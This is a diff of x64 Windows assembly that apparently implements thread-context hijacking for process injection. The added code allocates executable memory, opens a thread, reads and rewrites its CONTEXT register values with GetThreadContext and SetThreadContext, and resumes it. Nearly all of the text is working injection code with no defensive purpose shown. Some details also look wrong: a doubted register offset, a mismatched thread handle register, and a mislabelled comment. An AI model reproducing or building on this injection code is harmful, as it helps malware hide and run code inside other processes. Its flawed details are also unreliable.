@@ -423,7 +423,7 @@ CrtPrc:
 	lea rdx, [rsp + 0x50]
 	xor r8, r8
 	xor r9, r9
-	mov qword [rsp + 0x20], 0x0000000000000001
+	mov qword [rsp + 0x20], 0x0000000000000000
 	mov qword [rsp + 0x28], 0x0000000000000004
 	mov qword [rsp + 0x30], 0x0000000000000000
 	mov qword [rsp + 0x38], 0x0000000000000000
@@ -519,12 +519,20 @@ WProc:
 
 
 	;Change thread context w/ OpenThread to call GetThreadContext later w/o errors.
+	;Also get memory for the CONTEXT struct.
 	;------------------------------------
 	;HANDLE OpenThread(
 	;  [in] DWORD dwDesiredAccess,
 	;  [in] BOOL  bInheritHandle,
 	;  [in] DWORD dwThreadId
 	;);
+	xor rcx, rcx
+	mov qword rdx, 0x600
+	mov qword r8, 0x3000
+	mov qword r9, 0x40
+	mov qword rax, [rsp + 0x198]
+	call rax
+	mov qword [rsp + 0x300], rax		;CONTEXT data struct pointer.
 	mov qword rcx, 0x000f01ff
 	xor rdx, rdx
 	lea qword rax, [rsp + 0x26c]
@@ -540,8 +548,40 @@ WProc:
 	;  [in, out] LPCONTEXT lpContext
 	;);
 	mov qword rcx, rax
-	lea qword rdx, [rsp + 0x400]		;MAY NEED HEAP FOR THIS; TOOMUCH STACK == BULLSHIT!
+	mov qword r12, rax			;Save the thread handle for SetThreadContext.
+	mov qword rdx, [rsp + 0x300]		;Heap address for struct to get populated.
 	mov qword rax, [rsp + 0x178]
+	call rax
+	
+
+	;Set the RCX value in the target thread CONTEXT struct.
+	;------------------------------------
+	;Is the RCX value in CONTEXT 136 bytes from the base?
+	mov qword rax, [rsp + 0x300]
+	add rax, 0x88
+	mov qword rdx, [rsp + 0x2f8] 
+	mov qword [rax], rdx
+
+
+	;Get the thread context via SetThreadContext.
+	;------------------------------------
+	;BOOL SetThreadContext(
+	;  [in] HANDLE        hThread,
+	;  [in] const CONTEXT *lpContext
+	;);
+	mov qword rcx, r12
+	mov qword rdx, [rsp + 0x300]
+	mov qword rax, [rsp + 0x180]
+	call rax
+
+
+	;Resume the thread.
+	;------------------------------------
+	;DWORD ResumeThread(
+	;  [in] HANDLE hThread
+	;);
+	mov qword rcx, r11
+	mov qword rax, [rsp + 0x188]
 	call rax
 
 
